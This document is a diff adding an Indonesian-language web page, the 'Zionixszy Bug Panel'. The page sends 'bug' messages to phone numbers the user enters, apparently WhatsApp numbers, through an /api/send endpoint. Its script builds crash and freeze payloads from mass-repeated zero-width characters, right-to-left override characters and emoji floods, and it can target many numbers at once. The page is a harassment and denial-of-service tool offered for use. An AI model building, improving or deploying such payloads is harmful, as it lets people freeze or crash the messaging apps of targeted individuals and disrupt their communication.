@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Zionixszy Bug</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      max-width: 480px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #0f0f0f;
+      color: #eee;
+    }
+
+    h2 {
+      text-align: center;
+      color: #00ffe1;
+      text-shadow: 0 0 5px #00ffe1;
+    }
+
+    input, textarea, select {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      background: #1e1e1e;
+      color: #fff;
+    }
+
+    textarea::placeholder,
+    input::placeholder {
+      color: #999;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      background: linear-gradient(45deg, #00ffe1, #006eff);
+      border: none;
+      color: black;
+      font-weight: bold;
+      border-radius: 10px;
+      font-size: 16px;
+      transition: 0.3s;
+      box-shadow: 0 0 12px #00ffe1, 0 0 18px #006eff;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #00ffe1, 0 0 25px #006eff;
+    }
+
+    #status {
+      margin-top: 18px;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h2>Zionixszy Bug Panel</h2>
+
+  <label for="numbers">Nomor Target (pisahkan dengan koma):</label>
+  <input id="numbers" placeholder="628123xxxxxx,628222xxxxxx" />
+
+  <label for="bugType">Pilih Jenis Bug:</label>
+  <select id="bugType">
+    <option value="blank">💨 UI Delay / Blank</option>
+    <option value="freeze">❄️ Freeze Emoji + RTL</option>
+    <option value="lite">🫧 Kosong Ringan</option>
+    <option value="custom">✏️ Pesan Kustom</option>
+  </select>
+
+  <label for="custom">Pesan Kustom (jika dipilih):</label>
+  <textarea id="custom" rows="4" placeholder="Tulis pesan sendiri di sini…"></textarea>
+
+  <button onclick="send()">🚀 Kirim Unicode Bug</button>
+
+  <p id="status"></p>
+
+  <script>
+    function getBug(type) {
+      switch (type) {
+        case 'blank':
+          return '\u2063\u200F\u202E\u200B\u2060'.repeat(999999999999999);
+        case 'freeze':
+          return '🤣'.repeat(1500) + '\u202E'.repeat(1500) + '‏'.repeat(1000);
+        case 'lite':
+          return '\u200B\u2060'.repeat(500);
+        case 'custom':
+          return document.getElementById('custom').value.trim() || '[kosong]';
+        default:
+          return '...';
+      }
+    }
+
+    async function send() {
+      const status = document.getElementById('status');
+      const raw    = document.getElementById('numbers').value.trim();
+      const bugType = document.getElementById('bugType').value;
+
+      if (!raw) {
+        alert('Masukkan minimal satu nomor!');
+        return;
+      }
+
+      const list = raw.split(',').map(s => s.trim()).filter(Boolean);
+      const message = getBug(bugType);
+      status.textContent = 'Mengirim…';
+
+      try {
+        const res = await fetch('/api/send', {
+          method : 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body   : JSON.stringify(
+            list.length > 1
+              ? { list, message }
+              : { number: list[0], message }
+          )
+        });
+
+        const json = await res.json();
+        if (json.ok) {
+          status.textContent = `✅ Berhasil kirim ke ${json.sent ?? 1} nomor`;
+        } else {
+          status.textContent = '❌ Gagal: ' + json.error;
+        }
+      } catch (err) {
+        status.textContent = '❌ Error jaringan: ' + err.message;
+      }
+    }
+  </script>
+</body>
+</html>
